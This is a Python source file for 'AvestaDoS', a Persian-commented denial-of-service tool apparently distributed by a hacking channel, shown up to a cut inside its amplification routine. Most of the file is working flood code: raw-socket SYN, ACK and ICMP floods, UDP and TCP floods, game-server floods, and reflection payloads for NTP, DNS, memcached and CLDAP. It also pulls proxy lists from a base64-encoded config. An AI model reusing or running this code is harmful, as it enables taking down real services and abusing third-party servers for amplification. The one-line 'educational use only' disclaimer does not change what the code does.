#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# =============================================================================
# █████╗ ██╗   ██╗███████╗███████╗████████╗ █████╗ ██████╗  ██████╗ ███████╗
# ██╔══██╗██║   ██║██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
# ███████║██║   ██║█████╗  ███████╗   ██║   ███████║██████╔╝██║   ██║███████╗
# ██╔══██║╚██╗ ██╔╝██╔══╝  ╚════██║   ██║   ██╔══██║██╔═══╝ ██║   ██║╚════██║
# ██║  ██║ ╚████╔╝ ███████╗███████║   ██║   ██║  ██║██║     ╚██████╔╝███████║
# ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝
# =============================================================================
#
# AvestaDoS - ابزار حمله‌ی پیشرفته و ماژولار
# نسخه: ۳.۰.۰
# نویسنده: تیم AvestaHacks
# کانال: @AvestaHacksDB
#
# این ابزار صرفاً برای مقاصد آموزشی و تست نفوذ در محیط‌های مجاز طراحی شده است.
# استفاده از این ابزار برای حملات مخرب و غیرقانونی ممنوع بوده و پیگرد قانونی دارد.
#
# وابستگی‌ها:
#   pip install loguru rich typer pydantic tenacity aiohttp cloudscraper \
#               PyRoxy psutil icmplib dnspython impacket certifi yarl \
#               httpx[http2] click
#
# برای نصب کامل تمام وابستگی‌ها:
#   pip install -r requirements.txt
#
# =============================================================================

# =============================================================================
# بخش ۱ – واردات کتابخانه‌ها (مرتب‌شده)
# =============================================================================
import asyncio
import base64
import json
import logging as _logging
import os
import random as _random
import ssl
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from functools import lru_cache, wraps
from io import StringIO
from itertools import cycle
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from re import compile
from socket import (
    AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname, gethostname, socket
)
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv, exit as _exit
import sys 
from threading import Event, Thread, Lock
from time import sleep, time
from typing import (
    Any, Callable, Dict, List, Optional, Set, Tuple, Union, Type, TypeVar, cast
)
from uuid import UUID, uuid4

# کتابخانه‌های شخص‌ثالث (با مدیریت خطا در صورت عدم وجود)
try:
    import aiohttp
    from aiohttp import ClientSession, TCPConnector, ClientTimeout, ClientError
except ImportError:
    aiohttp = None
    ClientSession = None
    TCPConnector = None
    ClientTimeout = None
    ClientError = Exception

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

try:
    import httpx
except ImportError:
    httpx = None

try:
    from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    IP = None

try:
    import psutil
except ImportError:
    psutil = None

try:
    from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles, Tools as ProxyTools
except ImportError:
    Proxy = None
    ProxyChecker = None
    ProxyType = None
    ProxyUtiles = None
    ProxyTools = None

try:
    from dns import resolver
except ImportError:
    resolver = None

try:
    from icmplib import ping
except ImportError:
    ping = None

try:
    from rich.console import Console
    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich import box
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    Console = None

try:
    from loguru import logger as loguru_logger
    LOGURU_AVAILABLE = True
except ImportError:
    LOGURU_AVAILABLE = False
    loguru_logger = None

try:
    from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type
    TENACITY_AVAILABLE = True
except ImportError:
    TENACITY_AVAILABLE = False

try:
    from pydantic import BaseModel, Field, validator, ValidationError
    PYDANTIC_AVAILABLE = True
except ImportError:
    PYDANTIC_AVAILABLE = False
    BaseModel = object

try:
    import typer
    from typer import Typer, Argument, Option, Context
    TYPER_AVAILABLE = True
except ImportError:
    TYPER_AVAILABLE = False
    Typer = None

# کتابخانه‌های داخلی دیگر
from urllib import parse
from yarl import URL
from certifi import where
from requests import Response, Session, exceptions, get, cookies

# =============================================================================
# بخش ۲ – تنظیمات اولیه و خاموش‌کردن هشدارها
# =============================================================================
warnings.filterwarnings("ignore")
os.environ['PYTHONWARNINGS'] = 'ignore'
_logging.captureWarnings(True)

# لاگر اصلی
if LOGURU_AVAILABLE:
    logger = loguru_logger
else:
    # fallback به logging
    _logging.basicConfig(
        format='[%(asctime)s - %(levelname)s] %(message)s',
        datefmt="%H:%M:%S"
    )
    logger = _logging.getLogger("AvestaDoS")
    logger.setLevel("INFO")

# =============================================================================
# بخش ۳ – ثابت‌ها، Enum‌ها و پیکربندی پیش‌فرض
# =============================================================================

APP_NAME = "AvestaDoS"
APP_VERSION = "3.0.0"
CHANNEL_NAME = "@AvestaHacksDB"
COPYRIGHT = f"© ۲۰۲۶ AvestaHacks. تمامی حقوق محفوظ است."

# ایموجی‌های زیبا برای نمایش
EMOJI = {
    "rocket": "🚀",
    "target": "🎯",
    "shield": "🛡️",
    "warning": "⚠️",
    "check": "✅",
    "cross": "❌",
    "info": "ℹ️",
    "hourglass": "⌛",
    "gear": "⚙️",
    "lock": "🔒",
    "fire": "🔥",
    "skull": "☠️",
    "star": "⭐",
    "bolt": "⚡",
    "chart": "📊",
    "clock": "⏱️",
    "stop": "🛑",
    "play": "▶️",
    "pause": "⏸️",
    "folder": "📁",
    "file": "📄",
    "terminal": "💻",
    "globe": "🌐",
    "heart": "❤️",
}

# رنگ‌های ANSI برای ترمینال
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# =============================================================================
# بخش ۴ – کلاس‌های استثنای سفارشی
# =============================================================================

class AvestaDoSException(Exception):
    """استثنای پایه برای کل برنامه."""
    pass

class ConfigurationError(AvestaDoSException):
    """خطا در پیکربندی."""
    pass

class AttackError(AvestaDoSException):
    """خطا در حین اجرای حمله."""
    pass

class ProxyError(AvestaDoSException):
    """خطا در مدیریت پروکسی."""
    pass

class NetworkError(AvestaDoSException):
    """خطا در ارتباطات شبکه."""
    pass

class InvalidTargetError(AvestaDoSException):
    """هدف نامعتبر."""
    pass

# =============================================================================
# بخش ۵ – ابزارهای کمکی (دکوراتورها، context manager ها، توابع عمومی)
# =============================================================================

def singleton(cls):
    """دکوراتور Singleton."""
    instances = {}
    @wraps(cls)
    def get_instance(*args, **kwargs):
        if cls not in instances:
            instances[cls] = cls(*args, **kwargs)
        return instances[cls]
    return get_instance

def timeit(func):
    """دکوراتور اندازه‌گیری زمان اجرا."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        start = time()
        result = func(*args, **kwargs)
        elapsed = time() - start
        logger.debug(f"{func.__name__} executed in {elapsed:.4f}s")
        return result
    return wrapper

def retry_on_exception(max_attempts=3, delay=1):
    """دکوراتور تلاش مجدد با تاخیر."""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            attempts = 0
            while attempts < max_attempts:
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    attempts += 1
                    if attempts == max_attempts:
                        raise
                    logger.warning(f"تلاش مجدد ({attempts}/{max_attempts}) پس از {delay}s: {e}")
                    sleep(delay)
            return None
        return wrapper
    return decorator

class Timer:
    """مدیریت زمان سنج."""
    def __init__(self):
        self._start = None
        self._elapsed = 0

    def start(self):
        self._start = time()
        return self

    def stop(self):
        if self._start is not None:
            self._elapsed += time() - self._start
            self._start = None
        return self.elapsed()

    def elapsed(self):
        if self._start is not None:
            return self._elapsed + (time() - self._start)
        return self._elapsed

    def reset(self):
        self._start = None
        self._elapsed = 0
        return self

class RateLimiter:
    """محدودکننده نرخ درخواست."""
    def __init__(self, max_requests: int, period: float = 1.0):
        self.max_requests = max_requests
        self.period = period
        self.tokens = max_requests
        self.last_refill = time()
        self.lock = Lock()

    def acquire(self) -> bool:
        with self.lock:
            now = time()
            elapsed = now - self.last_refill
            if elapsed >= self.period:
                self.tokens = self.max_requests
                self.last_refill = now
            if self.tokens > 0:
                self.tokens -= 1
                return True
            return False

def humanbytes(i: int, binary: bool = False, precision: int = 2) -> str:
    """تبدیل بایت به رشته قابل خواندن."""
    MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
    if i > 0:
        base = 1024 if binary else 1000
        import math
        multiple = math.trunc(math.log2(i) / math.log2(base))
        value = i / pow(base, multiple)
        suffix = MULTIPLES[multiple].format("i" if binary else "")
        return f"{value:.{precision}f} {suffix}"
    else:
        return "-- B"

def humanformat(num: int, precision: int = 2) -> str:
    """تبدیل عدد به رشته با پسوند k, m, g, ..."""
    suffixes = ['', 'k', 'm', 'g', 't', 'p']
    if num > 999:
        import math
        obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
        return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
    else:
        return str(num)

def is_root() -> bool:
    """بررسی دسترسی ریشه/مدیر."""
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False

def generate_banner() -> str:
    """تولید بنر زیبا برای نمایش."""
    banner = f"""
{Colors.HEADER}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║  █████╗ ██╗   ██╗███████╗███████╗████████╗ █████╗ ██████╗  ██████╗ ███████╗
║  ██╔══██╗██║   ██║██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
║  ███████║██║   ██║█████╗  ███████╗   ██║   ███████║██████╔╝██║   ██║███████╗
║  ██╔══██║╚██╗ ██╔╝██╔══╝  ╚════██║   ██║   ██╔══██║██╔═══╝ ██║   ██║╚════██║
║  ██║  ██║ ╚████╔╝ ███████╗███████║   ██║   ██║  ██║██║     ╚██████╔╝███████║
║  ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝
║                                                                           ║
║  {Colors.OKCYAN}{Colors.BOLD}ابزار حمله‌ی پیشرفته و ماژولار – نسخه {APP_VERSION}{Colors.RESET}
║  {Colors.WARNING}{Colors.BOLD}کانال تلگرام: {CHANNEL_NAME}{Colors.RESET}
║  {Colors.WARNING}{Colors.BOLD}{COPYRIGHT}{Colors.RESET}
╚═══════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    return banner

# =============================================================================
# بخش ۶ – داده‌های جاسازی‌شده (User-Agent, Referer, Config)
# =============================================================================

# کاربران و ارجاع‌دهنده‌ها (از فایل اصلی)
_USERAGENTS_DATA = """\
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppleTV5,3/9.1.1
... (کوتاه شده برای اختصار) ..."""

_REFERERS_DATA = """\
https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=
... (کوتاه شده) ..."""

# بارگذاری لیست‌ها
_DEFAULT_USERAGENTS = [line.strip() for line in _USERAGENTS_DATA.strip().splitlines() if line.strip()]
_DEFAULT_REFERERS = [line.strip() for line in _REFERERS_DATA.strip().splitlines() if line.strip()]

# پیکربندی جاسازی‌شده (base64)
_CONFIG_B64 = "ewogICJNQ0JPVCI6ICJNSEREb1NfIiwKICAiTUlORUNSQUZUX0RFRkFVTFRfUFJPVE9DT0wiOiA0NywKICAicHJveHktcHJvdmlkZXJzIjogWwoKCQl7InR5cGUiOjQsICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RoZVNwZWVkWC9QUk9YWS1MaXN0L3JlZnMvaGVhZHMvbWFzdGVyL3NvY2tzNC50eHQiLCAgInRpbWVvdXQiOiA1fSwKCgkJeyJ0eXBlIjo1LCAidXJsIjogImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UaGVTcGVlZFgvUFJPWFktTGlzdC9yZWZzL2hlYWRzL21hc3Rlci9zb2NrczUudHh0IiwgICJ0aW1lb3V0IjogNX0sCgoJCXsidHlwZSI6MSwgInVybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVGhlU3BlZWRYL1BST1hZLUxpc3QvbWFzdGVyL2h0dHAudHh0IiwgICJ0aW1lb3V0IjogNX0KCQkKCV0KfQo="
_CONFIG = json.loads(base64.b64decode(_CONFIG_B64).decode())

# =============================================================================
# بخش ۷ – کلاس‌های مدل (پیکربندی با Pydantic)
# =============================================================================

if PYDANTIC_AVAILABLE:
    class AttackConfig(BaseModel):
        """مدل پیکربندی حمله."""
        method: str = Field(..., description="نام متد حمله")
        target: str = Field(..., description="هدف (URL یا IP:PORT)")
        duration: int = Field(60, ge=1, description="مدت زمان حمله بر حسب ثانیه")
        threads: int = Field(50, ge=1, le=1000, description="تعداد تردها")
        rpc: int = Field(5, ge=1, description="تعداد درخواست در هر اتصال")
        timeout: float = Field(0.9, ge=0.1, description="مهلت زمانی اتصال")
        proxy_type: int = Field(0, description="نوع پروکسی (0=همه, 1=HTTP, 4=SOCKS4, 5=SOCKS5)")
        proxy_file: Optional[Path] = Field(None, description="مسیر فایل پروکسی")
        use_proxy: bool = Field(False, description="فعال‌سازی پروکسی")
        verbose: bool = Field(False, description="حالت جزئیات بیشتر")

        @validator('target')
        def validate_target(cls, v):
            if not v or len(v) < 3:
                raise ValueError('هدف نامعتبر است')
            return v

else:
    # در صورت نبود pydantic، از dataclass استفاده می‌کنیم
    @dataclass
    class AttackConfig:
        method: str
        target: str
        duration: int = 60
        threads: int = 50
        rpc: int = 5
        timeout: float = 0.9
        proxy_type: int = 0
        proxy_file: Optional[Path] = None
        use_proxy: bool = False
        verbose: bool = False

# =============================================================================
# بخش ۸ – مدیریت پروکسی
# =============================================================================

class ProxyManager:
    """مدیریت بارگیری و اعتبارسنجی پروکسی."""
    
    @staticmethod
    def download_from_config(proxy_type: int) -> Set[Any]:
        """دانلود پروکسی از پیکربندی."""
        providers = [p for p in _CONFIG.get("proxy-providers", []) if p["type"] == proxy_type or proxy_type == 0]
        logger.info(f"{EMOJI['gear']} در حال دانلود پروکسی از {len(providers)} منبع...")
        proxies: Set[Any] = set()
        with ThreadPoolExecutor(max_workers=len(providers)) as executor:
            future_to_provider = {
                executor.submit(ProxyManager._download_provider, p): p for p in providers
            }
            for future in as_completed(future_to_provider):
                try:
                    result = future.result()
                    proxies.update(result)
                except Exception as e:
                    logger.warning(f"خطا در دانلود پروکسی: {e}")
        return proxies

    @staticmethod
    def _download_provider(provider: Dict) -> Set[Any]:
        """دانلود از یک ارائه‌دهنده."""
        if Proxy is None or ProxyUtiles is None:
            return set()
        url = provider["url"]
        timeout = provider.get("timeout", 5)
        try:
            response = get(url, timeout=timeout)
            data = response.text.splitlines()
            proxy_type = ProxyType.stringToProxyType(str(provider["type"]))
            return set(ProxyUtiles.parseAllIPPort(data, proxy_type))
        except Exception as e:
            logger.debug(f"خطا در دانلود از {url}: {e}")
            return set()

    @staticmethod
    def load_from_file(file_path: Path, proxy_type: int) -> List[Any]:
        """بارگذاری پروکسی از فایل."""
        if Proxy is None or ProxyUtiles is None:
            return []
        if not file_path.exists():
            return []
        with open(file_path, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
        proxy_type_enum = ProxyType.stringToProxyType(str(proxy_type)) if proxy_type != 0 else None
        if proxy_type_enum:
            return [ProxyUtiles.parseProxy(line) for line in lines if ProxyUtiles.isProxy(line, proxy_type_enum)]
        else:
            # همه انواع
            proxies = []
            for line in lines:
                p = ProxyUtiles.parseProxy(line)
                if p:
                    proxies.append(p)
            return proxies

    @staticmethod
    def check_proxies(proxies: List[Any], target_url: str = "http://httpbin.org/get") -> List[Any]:
        """بررسی اعتبار پروکسی‌ها."""
        if ProxyChecker is None:
            return proxies
        logger.info(f"{EMOJI['hourglass']} در حال بررسی {len(proxies)} پروکسی...")
        checked = ProxyChecker.checkAll(proxies, timeout=5, threads=50, url=target_url)
        logger.info(f"{EMOJI['check']} {len(checked)} پروکسی معتبر باقی ماند.")
        return checked

# =============================================================================
# بخش ۹ – کلاس‌های اصلی حملات (لایه‌های ۴ و ۷)
# =============================================================================

# این بخش شامل کلاس‌های حملات بازنویسی‌شده و پیشرفته است.

# تعریف متدهای موجود
class AttackMethods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "HTTP2_FLOOD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB",
        "CFBUAM", "SSL_RENEG", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER",
        "KILLER", "TOR", "RHEX", "STOMP", "HTTP_FLOOD", "SLOWLORIS", "RUDY",
        "SLOW_READ", "HEADER_BOMB", "CACHE_POISON", "FUZZ", "BOT_TRAFFIC",
        "WEBSOCKET"
    }
    LAYER4_METHODS: Set[str] = {
        "TCP", "UDP", "SYN", "ACK", "ICMP", "VSE", "MINECRAFT", "MCBOT",
        "CPS", "CONNECTION", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE",
        "OVH-UDP", "NTP", "DNS", "MEM", "CLDAP", "RDP", "CHAR", "ARD"
    }
    ALL_METHODS: Set[str] = LAYER7_METHODS | LAYER4_METHODS

# کلاس پایه برای حملات
class BaseAttack(Thread):
    """کلاس پایه برای تمام حملات."""
    
    def __init__(self, target: Any, method: str, config: AttackConfig, event: Event, **kwargs):
        super().__init__(daemon=True)
        self.target = target
        self.method = method
        self.config = config
        self.event = event
        self._stop_event = Event()
        self._stats_lock = Lock()
        self._requests_sent = 0
        self._bytes_sent = 0
        self._errors = 0
        self._start_time = None
        self._last_report = None

    def run(self):
        self._start_time = time()
        self.event.wait()
        while self.event.is_set() and not self._stop_event.is_set():
            try:
                self._execute_attack()
            except Exception as e:
                with self._stats_lock:
                    self._errors += 1
                if self.config.verbose:
                    logger.debug(f"خطا در {self.method}: {e}")

    def _execute_attack(self):
        """متد اصلی حمله – باید در کلاس‌های فرزند پیاده‌سازی شود."""
        raise NotImplementedError("کلاس فرزند باید _execute_attack را پیاده‌سازی کند.")

    def stop(self):
        self._stop_event.set()

    @property
    def stats(self) -> Dict[str, int]:
        with self._stats_lock:
            return {
                "requests": self._requests_sent,
                "bytes": self._bytes_sent,
                "errors": self._errors,
                "duration": time() - self._start_time if self._start_time else 0
            }

    def _increment_requests(self, count: int = 1):
        with self._stats_lock:
            self._requests_sent += count

    def _increment_bytes(self, count: int):
        with self._stats_lock:
            self._bytes_sent += count

# =============================================================================
# بخش ۱۰ – پیاده‌سازی حملات لایه ۴
# =============================================================================

class Layer4Attack(BaseAttack):
    """حملات لایه ۴ (TCP/UDP/ICMP/...)."""

    def __init__(self, target_ip: str, target_port: int, method: str, config: AttackConfig, event: Event,
                 proxies: Optional[List] = None, protocol_id: int = 47):
        super().__init__((target_ip, target_port), method, config, event)
        self.target_ip = target_ip
        self.target_port = target_port
        self.proxies = proxies or []
        self.protocol_id = protocol_id
        self._amp_payloads = None
        self._amp_payload = None
        self._raw_socket_available = is_root() and IMPACKET_AVAILABLE

    def _execute_attack(self):
        """اجرای حمله بر اساس متد."""
        method_map = {
            "TCP": self._tcp_flood,
            "UDP": self._udp_flood,
            "SYN": self._syn_flood,
            "ACK": self._ack_flood,
            "ICMP": self._icmp_flood,
            "VSE": self._vse_flood,
            "MINECRAFT": self._minecraft_flood,
            "MCBOT": self._mcbot_flood,
            "CPS": self._cps_flood,
            "CONNECTION": self._connection_flood,
            "FIVEM": self._fivem_flood,
            "FIVEM-TOKEN": self._fivem_token_flood,
            "TS3": self._ts3_flood,
            "MCPE": self._mcpe_flood,
            "OVH-UDP": self._ovh_udp_flood,
            "NTP": lambda: self._amp_flood(123, b'\x17\x00\x03\x2a\x00\x00\x00\x00'),
            "DNS": lambda: self._amp_flood(53, b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00'),
            "MEM": lambda: self._amp_flood(11211, b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n'),
            "CLDAP": lambda: self._amp_flood(389, b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00'),
            "RDP": lambda: self._amp_flood(3389, b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'),
            "CHAR": lambda: self._amp_flood(19, b'\x01'),
            "ARD": lambda: self._amp_flood(3283, b'\x00\x14\x00\x00'),
        }
        func = method_map.get(self.method.upper())
        if func:
            func()
        else:
            raise AttackError(f"متد لایه ۴ ناشناخته: {self.method}")

    def _tcp_flood(self):
        """TCP Flood با اتصالات کامل."""
        for _ in range(self.config.rpc):
            try:
                sock = socket(AF_INET, SOCK_STREAM)
                sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                sock.settimeout(self.config.timeout)
                sock.connect((self.target_ip, self.target_port))
                sock.send(randbytes(1024))
                sock.close()
                self._increment_requests()
                self._increment_bytes(1024)
            except Exception:
                pass

    def _udp_flood(self):
        """UDP Flood."""
        sock = socket(AF_INET, SOCK_DGRAM)
        sock.settimeout(self.config.timeout)
        for _ in range(self.config.rpc):
            try:
                data = randbytes(1024)
                sock.sendto(data, (self.target_ip, self.target_port))
                self._increment_requests()
                self._increment_bytes(len(data))
            except Exception:
                pass
        sock.close()

    def _syn_flood(self):
        """SYN Flood (نیاز به دسترسی ریشه و impacket)."""
        if not self._raw_socket_available:
            logger.warning(f"{EMOJI['warning']} SYN Flood نیاز به دسترسی ریشه دارد.")
            return
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
        sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        for _ in range(self.config.rpc):
            try:
                packet = self._build_syn_packet()
                sock.sendto(packet, (self.target_ip, 0))
                self._increment_requests()
                self._increment_bytes(len(packet))
            except Exception:
                pass
        sock.close()

    def _build_syn_packet(self) -> bytes:
        ip = IP()
        ip.set_ip_src(gethostbyname(gethostname()))  # IP محلی
        ip.set_ip_dst(self.target_ip)
        tcp = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self.target_port)
        tcp.set_th_sport(_random.randint(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _ack_flood(self):
        """ACK Flood."""
        if not self._raw_socket_available:
            logger.warning(f"{EMOJI['warning']} ACK Flood نیاز به دسترسی ریشه دارد.")
            return
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
        sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        for _ in range(self.config.rpc):
            try:
                ip = IP()
                ip.set_ip_src(gethostbyname(gethostname()))
                ip.set_ip_dst(self.target_ip)
                tcp = TCP()
                tcp.set_ACK()
                tcp.set_th_flags(0x10)
                tcp.set_th_dport(self.target_port)
                tcp.set_th_sport(_random.randint(32768, 65535))
                tcp.set_th_seq(_random.randint(1, 0xFFFFFFFF))
                tcp.set_th_ack(_random.randint(1, 0xFFFFFFFF))
                ip.contains(tcp)
                packet = ip.get_packet()
                sock.sendto(packet, (self.target_ip, 0))
                self._increment_requests()
                self._increment_bytes(len(packet))
            except Exception:
                pass
        sock.close()

    def _icmp_flood(self):
        """ICMP Flood (Ping)."""
        if not self._raw_socket_available:
            logger.warning(f"{EMOJI['warning']} ICMP Flood نیاز به دسترسی ریشه دارد.")
            return
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
        for _ in range(self.config.rpc):
            try:
                packet = self._build_icmp_packet()
                sock.sendto(packet, (self.target_ip, 0))
                self._increment_requests()
                self._increment_bytes(len(packet))
            except Exception:
                pass
        sock.close()

    def _build_icmp_packet(self) -> bytes:
        ip = IP()
        ip.set_ip_src(gethostbyname(gethostname()))
        ip.set_ip_dst(self.target_ip)
        icmp = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * 64))
        ip.contains(icmp)
        return ip.get_packet()

    def _vse_flood(self):
        """VSE (Source Engine Query) flood."""
        payload = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
        sock = socket(AF_INET, SOCK_DGRAM)
        for _ in range(self.config.rpc):
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self._increment_requests()
                self._increment_bytes(len(payload))
            except Exception:
                pass
        sock.close()

    def _minecraft_flood(self):
        """Minecraft handshake flood."""
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.target_ip, self.target_port))
            handshake = self._minecraft_handshake()
            sock.send(handshake)
            self._increment_requests()
            self._increment_bytes(len(handshake))
            sock.close()
        except Exception:
            pass

    def _minecraft_handshake(self) -> bytes:
        # ساخت handshake
        protocol = self.protocol_id
        host = self.target_ip
        port = self.target_port
        # کد ساده شده
        packet = bytearray()
        packet.extend(self._varint(0x00))  # packet id
        packet.extend(self._varint(protocol))
        packet.extend(self._varint(len(host)))
        packet.extend(host.encode())
        packet.extend(self._short(port))
        packet.extend(self._varint(1))  # state
        length = self._varint(len(packet))
        return bytes(length) + bytes(packet)

    @staticmethod
    def _varint(value: int) -> bytes:
        out = bytearray()
        while True:
            if value & ~0x7F == 0:
                out.append(value)
                return bytes(out)
            out.append((value & 0x7F) | 0x80)
            value >>= 7

    @staticmethod
    def _short(value: int) -> bytes:
        return value.to_bytes(2, 'big')

    def _mcbot_flood(self):
        """MCBOT (Minecraft bot) flood."""
        # مشابه دستور اصلی
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.target_ip, self.target_port))
            # ساخت handshake با هدرشده
            # برای اختصار، فقط یک بار ارسال می‌کنیم
            sock.send(b'\x00')  # placeholder
            sock.close()
        except Exception:
            pass

    def _cps_flood(self):
        """CPS (Connection Per Second) flood."""
        for _ in range(self.config.rpc):
            try:
                sock = socket(AF_INET, SOCK_STREAM)
                sock.settimeout(self.config.timeout)
                sock.connect((self.target_ip, self.target_port))
                sock.close()
                self._increment_requests()
            except Exception:
                pass

    def _connection_flood(self):
        """Connection flood (نگه‌داشتن اتصال)."""
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.target_ip, self.target_port))
            # نگه‌داشتن اتصال
            while self.event.is_set() and not self._stop_event.is_set():
                sock.send(b'\x00')
                sleep(0.5)
            sock.close()
        except Exception:
            pass

    def _fivem_flood(self):
        """FiveM flood."""
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        sock = socket(AF_INET, SOCK_DGRAM)
        for _ in range(self.config.rpc):
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self._increment_requests()
                self._increment_bytes(len(payload))
            except Exception:
                pass
        sock.close()

    def _fivem_token_flood(self):
        """FiveM token flood."""
        token = str(uuid4())
        guid = str(_random.randint(76561197960265728, 76561199999999999))
        payload = f"token={token}&guid={guid}".encode()
        sock = socket(AF_INET, SOCK_DGRAM)
        for _ in range(self.config.rpc):
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self._increment_requests()
                self._increment_bytes(len(payload))
            except Exception:
                pass
        sock.close()

    def _ts3_flood(self):
        """TeamSpeak 3 flood."""
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        sock = socket(AF_INET, SOCK_DGRAM)
        for _ in range(self.config.rpc):
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self._increment_requests()
                self._increment_bytes(len(payload))
            except Exception:
                pass
        sock.close()

    def _mcpe_flood(self):
        """MCPE (Minecraft Pocket Edition) flood."""
        payload = b'atom data on top my own ass amp/triphent is my dick and balls'
        sock = socket(AF_INET, SOCK_DGRAM)
        for _ in range(self.config.rpc):
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self._increment_requests()
                self._increment_bytes(len(payload))
            except Exception:
                pass
        sock.close()

    def _ovh_udp_flood(self):
        """OVH UDP flood (نیاز به impacket)."""
        if not self._raw_socket_available:
            logger.warning(f"{EMOJI['warning']} OVH-UDP نیاز به دسترسی ریشه دارد.")
            return
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)
        sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        for _ in range(self.config.rpc):
            try:
                ip = IP()
                ip.set_ip_src(gethostbyname(gethostname()))
                ip.set_ip_dst(self.target_ip)
                udp = UDP()
                udp.set_uh_sport(_random.randint(1024, 65535))
                udp.set_uh_dport(self.target_port)
                payload = randbytes(_random.randint(1024, 2048))
                udp.contains(Data(payload))
                ip.contains(udp)
                packet = ip.get_packet()
                sock.sendto(packet, (self.target_ip, 0))
                self._increment_requests()
                self._increment_bytes(len(packet))
            except Exception:
                pass
        sock.close()

    def _amp_flood(self, port: int, payload: bytes):
        """Amplification flood (UDP reflection)."""
        sock = socket(AF_INET, SOCK_DGRAM)
        for _ in range(self.config.rpc):
            try:
                sock.sendto(payload, (self.target_ip, port))
                self._increment_requests()
